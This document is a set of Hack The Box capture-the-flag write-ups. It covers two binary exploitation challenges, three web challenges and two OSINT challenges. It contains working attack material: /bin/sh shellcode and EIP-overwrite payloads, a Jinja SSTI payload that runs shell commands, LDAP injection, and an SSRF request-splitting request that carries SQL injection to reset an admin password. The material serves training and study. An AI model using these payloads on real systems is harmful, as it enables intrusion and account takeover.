# Challenges

- Added HTB cyber-apocalypse post-CTF analysis (check out `./cyberapocalypse`) 

## Pwn

### Space

[Space](https://app.hackthebox.eu/challenges/Space)

**Challenge info**: roaming in a small space

```c

/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */


void vuln(char *param_1)

{
  char local_12 [10];
  
  strcpy(local_12,param_1);
  return;
}

undefined4 main(void)

{
  undefined local_2f [31];
  undefined *local_10;
  
  local_10 = &stack0x00000004;
  printf("> ");
  fflush(stdout);
  read(0,local_2f,0x1f);
  vuln(local_2f);
  return 0;
}
```

- Instruction pointer is at `0xffffd02c` filled with `0x08049231` (the address of the next instruction after `vuln()`)

- There is 18 bytes worth space before the EIP and 31 - (18 + 4) = 9 bytes. Another way to think about this: 10 bytes of buffer + 4 bytes overflow in EBP + 4 bytes overflow in ESP = 18 bytes to reach RIP

One shellcode that works independently in the context:

```s
.global _start
_start:
.intel_syntax noprefix

L1:    mov rcx, 0xFF978CD091969DD0
L2: not rcx
    xor rsi, rsi
    jmp label
    .byte 0x41
    .byte 0xd0
    .byte 0xff
    .byte 0xff
label: 
    push rcx
    mov rdi, rsp
    mov al, 0x3b
    syscall
```

However, the stack fills things in `ecx` and the rest 4 bytes (instead of going in ecx) go as data and insert a segmentation fault. This is a 32 bit binary and should be treated as such. To be honest, the register file in gdb should have been the giveaway that the binary was 32 bit

```s
[SECTION .text]
global _start
_start:
    xor eax, eax
    push eax
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    push eax
    jmp label
    nop
    nop
    nop
     nop
label: 
    
    push ebx
    mov ecx, esp
    mov al, 0xb
    xor edx, edx
    int 0x80
```

And compile it with:

- `nasm -f elf32 -l 32bit_shellcode 32bit_shellcode.asm`

- `ld -m elf_i386 32bit_shellcode.o -o 32bit_shellcode`

- Now execute it with `./32bit_shellcode`

Generate payload: `python2 -c "print('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\xeb\x04' + '\x41\xd0\xff\xff' + '\x53\x89\xe1\xb0\x0b\x31\xd2\xcd\x80')" > payload`

**Flag**: HTB{sh3llc0de_1n_7h3_5p4c3}

### You Know 0xDiaboles

[Diablos](https://app.hackthebox.eu/challenges/You-know-0xDiablos)

**Challenge info**: I missed my flag

```c
void vuln(void)

{
  char local_bc [180];
  
  gets(local_bc);
  puts(local_bc);
  return;
}

undefined4 main(void)

{
  __gid_t __rgid;
  
  setvbuf(stdout,(char *)0x0,2,0);
  __rgid = getegid();
  setresgid(__rgid,__rgid,__rgid);
  puts("You know who are 0xDiablos: ");
  vuln();
  return 0;
}

```
- We have a buffer overflow > 180 bytes. Security: Partial RELRO, NX disabled, PIE disabled. This means shellcode can be injected; and address space randomisation isn't there.

```py
python2 -c "print('A'*180 + 'BBBBCCCCDDDD')"
```

It turns out that:

```s
EBX = BBBB
EBP = CCCC
EIP = DDDD
```

- So that's how EIP can be overridden. Since stack is executable, if EIP is overriden with the address of the buffer (where shellcode shall be injected), it will execute. Since PIE is disabled, stack will always will be at the same location. So hardcode it :)

- And the buffer at stack starts at 0xffffcf70 with EIP at 0xffffd020. 

```s
cat shellcode-raw > payload
python2 -c "print('BBBBCCC' + '\x70\xcf\xff\xff');" >> payload
```

After a long while, I figured out it isn't about shellcoding. It's asking the EIP to jump to the flag function and modify it's two arguments.

```py
python2 -c "print('A'*188 + '\xe2\x91\x04\x08'+'A'*4+'\xef\xbe\xad\xde\r\xd0\xde\xc0')"
```

Have a look:

![Stack structure](./images/stack-frame-structure.png)

Even if you are not sure about the offset: simply see the comparison

```s
   0x08049246 <+100>:	cmp    DWORD PTR [ebp+0x8],0xdeadbeef
   0x0804924d <+107>:	jne    0x8049269 <flag+135>
   0x0804924f <+109>:	cmp    DWORD PTR [ebp+0xc],0xc0ded00d
   0x08049256 <+116>:	jne    0x804926c <flag+138>
```
When you reach this statement, check `x/128x $ebp` and `x/x $ebp+0x8`. By carefully overwritting values after EIP, you should be able to determine the offset wherein the argument should be placed.

Flag: HTB{0ur_Buff3r_1s_not_healthy}

## Web

### Emdee five for life 

[Emdee five for life](https://app.hackthebox.eu/challenges/Emdee-five-for-life)

Can you encrypt fast enough? Surely we need scripting here. A very simply python script capturing the webpage input, hashing the thing, and posting it back will give the flag. 

Flag: HTB{N1c3_ScrIpt1nG_B0i!}

### Templated

[Templated](https://app.hackthebox.eu/challenges/Templated)

Can you exploit this simple mistake? 

At first glance, one would think this supports a simple GET, so what's the big deal about this. After all, there are no apparent ways to send input to the server. The source code is simple two line HTML. However, if you look at `host/xyz`, you shall see the value displayed on the 404 page. A very simple misconfiguration, but deadly. Now on to craft a SSTI payload. SSTI can be confirmed through `http://..../{{3*3}}` and getting back a 9.

```s
{{ config.items() }}
{{ config.from_object('os') }}
{{"".__class__.__mro__[1].__subclasses__()[414].__init__.__globals__["__builtins__"]["__import__"]("os").popen("cat flag.txt").read()}}
```
### Phonebook

[Phonebook](https://app.hackthebox.eu/challenges/Phonebook)

Who is lucky enough to be included in the phonebook?

So the actual page has a login system which did not work for SQLi. Viewing the source reveals certain HTML resources from a weird directory `964430b4cdd199af19b986eaf2193b21f32542d0` which when opened gives the search functionality. Reading the source code gives some jquery that seems like making a POST to `/search` and getting an access denied everytime.

```s
function search(form) {
      var searchObject = new Object();
      searchObject.term = $("#searchfield").val();
      $.ajax({
        type: "POST",
        url: "/search",
        data: JSON.stringify(searchObject),
        success: success,
        dataType: "json",
    });
    };
```
A simple asterisk (*) works as the username and password (typical LDAP injection) and leads to the same page as before. Now we have a session cookie attached which wasn't there before. So now POST to `/search` work perfectly and we get information back on `resse`. The search functionality with `term` is matching the presence of the value of the term in the mail. After a while, it is realised that this is not our usual json.stringify problem. It is rather an LDAP injection wherein the password can be bruteforced using normal [LDAP injection](https://www.netsparker.com/blog/web-security/ldap-injection-how-to-prevent/). Basically, a brute force attack on user `reese` and password `HTB{@*` where information is put into @ leads to recovery of the flag. Knowing that password of reese is the flag we are looking for is more of a challenge specific thing. Add LDAP to the list of things understood. In hindsight, the structure of the challenge: information of users being stored in a directory and offering search capability was a giveaway for LDAP services and trying to inject LDAP.

Flag: HTB{d1rectory_h4xx0r_is_k00l}

### Weather App

A pit of eternal darkness, a mindless journey of abeyance, this feels like a never-ending dream. I think I'm hallucinating with the memories of my past life, it's a reflection of how thought I would have turned out if I had tried enough. A weatherman, I said! Someone my community would look up to, someone who is to be respected. I guess this is my way of telling you that I've been waiting for someone to come and save me. This weather application is notorious for trapping the souls of ambitious weathermen like me. Please defeat the evil bruxa that's operating this website and set me free!

- Registration on `/register` is only working through localhost. This can be seen through `routes/index.js` which is giving a 401 for non-localhost sources, as well as in database.js wherein there's a comment `// TODO: add parameterization and roll public` which suggests the registration has not yet rolled public.

- `admin` password is randomly generated, and logging as admin on `login` shall give the flag.  

- This challenge comes with docker files, so set the system up on localhost and test it out.

- For the `POST /register` thing, we have the following `if (req.socket.remoteAddress.replace(/^.*:/, '') != '127.0.0.1')`. From this [link](https://stackoverflow.com/questions/31100703/stripping-ffff-prefix-from-request-connection-remoteaddress-nodejs), it is clear that we are stripping ::ffff: from the remote address. From the checks done on localhost, the defaults are IPv4. The way to bypass this be SSRF wherein we fool the server into believing the request for registration came from the server itself. This [link](https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/) speaks of a security bug in unicode unwrapping in http.get() for node 8 or less, exactly the thing used in the application at `/api/weather`. Through a simple `console.log(http.get(url).output);` in HTTPHelper.js, monitoring of the request can be done.

- Observation made: HTTP control characters are URL encoded. 

```s
POST /api/weather HTTP/1.1
Host: ip:port
User-Agent: cGFzcw==
Content-Type: application/x-www-form-urlencoded
Content-Length: 462
Connection: close

endpoint=127.0.0.1:80&city=ĠHTTP/1.1ĊHost:Ġ127.0.0.1:80ĊConnection:Ġkeep-aliveĊĊĊPOSTĠ/registerĠHTTP/1.1ĊHost:Ġ127.0.0.1:80ĊContent-Type:Ġapplication/x-www-form-urlencodedĊUser-Agent:ĠMozilla/5.0Ġ(X11;ĠLinuxĠx86_64;Ġrv:85.0)ĠGecko/20100101ĠFirefox/85.0ĊConnection:Ġkeep-aliveĊContent-Length:Ġ110ĊĊusername=adminĦpassword=admin%27)%20ON%20CONFLICT(username)%20DO%20UPDATE%20SET%20password=%27pass%27%20--+-ĊĊGETĠ/?&country=register
```
**Some characters haven't been encoded properly**

Flag: HTB{w3lc0m3_t0_th3_p1p3_dr34m}

## OSINT

The idea is to engage with data in publicy available domains to get a sense of the target in general.

### Easy Phish

[Easy Phish](https://app.hackthebox.eu/challenges/Easy-Phish)

```sh
Customers of secure-startup.com have been recieving some very convincing phishing emails, 
can you figure out why?
```
- The host is no longer accessible from public domain. This may mean it was moved or shut down.

- Internet archives, wayback machine has entries related ot his. It was indexed on Sept. 22, 2020 and has stuff like text/html and image/gif. Not that useful.

- `dnsrecon -d secure-startup.com` returns a TXT DNS record of the form

```s
TXT secure-startup.com v=spf1 a mx ?all - HTB{RIP_SPF_Always_2nd
```
A TXT resource record allows to match arbitrary text with a domain. The part within { is half the flag. From `v=spf1 a mx ?all`, this looks like a SFP (Sender policy framework) record, which is related to email authentication (the problem the challenge asks to solve in the first place).

- Using `dig secure-startup.com -t txt`

```s
;; ANSWER SECTION:
secure-startup.com.     445     IN      TXT     "v=spf1 a mx ?all - HTB{RIP_SPF_Always_2nd"
```
- The mails being recieved by the recipients are spoofs. Thereby, they may have failed the DMARC test. Thereby, it is essential to query those records too. Navigate to `mxtoolbox.com/` and query DMARC to see reporting and conformance of emails.

```s
v=DMARC1;p=none;_F1ddl3_2_DMARC}
```

Final flag: HTB{RIP_SPF_Always_2nd_F1ddl3_2_DMARC}

Better way

```s
dig TXT linuxincluded.com
dig TXT dkim._domainkey.linuxincluded.com
dig TXT _dmarc. linuxincluded.com
```
### Money Flowz

[Money Flowz](https://app.hackthebox.eu/challenges/Money-Flowz)


```sh
Frank Vitalik is a hustler, can you figure out where the money flows?
```
- Searching on the fellow, there comes a [twitter profile](https://twitter.com/frankvitalik). I am not sure if the person is the same that I am looking for. But the dates of the tweets are around the same time the challenge was released (10 months at the time of the writing). Then there's two reddit posts: [post1](https://www.reddit.com/user/frankvitalik/comments/goxkz7/whats_the_cleverest_scam_youve_seen_in_crypto/) and [post2](https://www.reddit.com/user/frankvitalik/comments/goxefp/incredible_scam_giveaway_you_can_get_free_coins/). This is exactly what I am looking for: this person is the HTB crypto enthusiast.

- Post 2 has a link for having free fake coins [Freecoinz](https://steemit.com/htb/@freecoinz/freecoinz)

```sh
Super Ethereum SCAM Giveaway
(?)Deposit 10X ETH to this address and get 20X ETH back!!(?)
0x1b3247Cd0A59ac8B37A922804D150556dB837699
you can get free coinz!
```
and a comment by the poster themselves:

```sh
Wow! I can't believe they are giving free coins into the ropsten net!
```
- Post 1 however takes one into the details of a crypto scam wherein someone leaked their private key in their address and honeypotted the users into trying to hack their ethereum. There's a bot watching the wallet, and as soon as Ethers come in, the bot takes them away.

Scammer [etherscan.io page](https://etherscan.io/address/0xb7605ddc0327406a7ac225b9de87865e22ac5927)

Details of the scam on [bitcoin forum](https://bitcointalk.org/index.php?topic=2237480.0)
